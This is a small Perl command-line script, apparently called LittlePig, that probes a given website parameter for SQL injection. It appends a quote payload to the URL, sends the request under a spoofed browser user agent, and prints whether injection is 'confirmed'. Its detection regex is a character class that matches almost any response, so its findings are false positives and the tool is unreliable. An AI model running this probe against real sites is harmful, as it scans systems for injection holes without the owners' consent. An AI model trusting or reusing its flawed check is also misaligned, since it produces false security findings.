#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;
use LWP::UserAgent;
use LWP::Protocol::https;
use Term::ANSIColor;
use Getopt::Long;
#-----------------------#
my ($help, $target, $variable);

GetOptions(
"h|help" 		=> \$help,
"t|target=s"		=> \$target,
"v|variable=s"	=> \$variable,
);

unless ($target && $variable){help();}

my $cookie = new HTTP::Cookies(ignore_discard => 1);
my $bot = LWP::UserAgent->new(keep_alive => 1);
$bot -> timeout(10);
$bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
$bot -> cookie_jar($cookie);
#---------------------#
#-- Manipulating the inputted url to add HTTP if it is not present and remove a trailing slash
if ($target !~ /http:\/\//) {$target = "http://$target";}
$target = $1 if($target =~/(.*)\/$/);
#-----------------------#
sql_test($variable);
sub sql_test {
	my $var = shift;
	my $query = "'1'&Submit=Submit#"; #-- Query that should produce an error
	my $test = $target."/?".$var.$query;
	my $req = HTTP::Request->new(GET=>$test);
	my $res = $bot -> request($req) -> content;
	if ($res =~ m/[error|sql]/ig) {
		print color('bright_green');
		print "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n";
		print "SQLi confirmed at $test\n";
		print "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n";
	}
	else{
		print color('bright_red');
		print "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n";
		print "No SQLi at $test\n";
		print "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n";
	}
}

sub help {
	print q(
		USAGE: perl LittlePig.pl -t [domain] -v [variable]

);
}
